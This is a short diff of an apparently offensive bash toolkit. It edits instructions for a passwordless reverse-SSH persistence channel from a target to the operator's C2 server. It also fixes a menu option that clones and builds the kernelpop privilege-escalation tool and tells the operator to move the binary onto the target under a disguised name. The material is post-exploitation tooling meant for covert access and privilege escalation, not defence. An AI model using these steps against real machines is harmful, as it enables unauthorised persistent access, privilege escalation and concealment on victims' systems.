@@ -946,7 +946,7 @@ EOF
 cat << "EOF"
 ***WARNING*** This setup requires cert only authentication both ways to maintain persistence. 
 The means the target machine will have the ability to SSH into your C2 WITHOUT A PASSWORD! However, this can be done safely.
-Once this is setup you need to run "service ssh stop" and make sure the SSH service does not start by default on boot.
+Once this is setup you need to run "systemctl disable ssh && service ssh stop" to make sure the SSH service does not start by default on boot.
 To check, after startup, run "service ssh status" to see if the service shows as inactive or active. If inactive/dead you are safe.
 When you need to interact with the target, simply run "service ssh start". Then wait 1 minute or less and run:
 ssh -l TARGET_USERNAME -p TARGET_PORT localhost   (as per the instructions above)
@@ -2477,7 +2477,7 @@ select opt in "${options[@]}"
 	        ;;
 	    "Kernelpop Privilege Escalation Automation")
     git clone https://github.com/spencerdodd/kernelpop ~/kernelpop
-	cd kernelpop
+	cd ~/kernelpop
 	./create_executable.sh
 	./kernelpop
     echo -e "\E[1;34m::::: \e[97mMove ~/kernelpop/kernelpop File To Target (rename it to fly cloaked) \E[1;34m:::::"
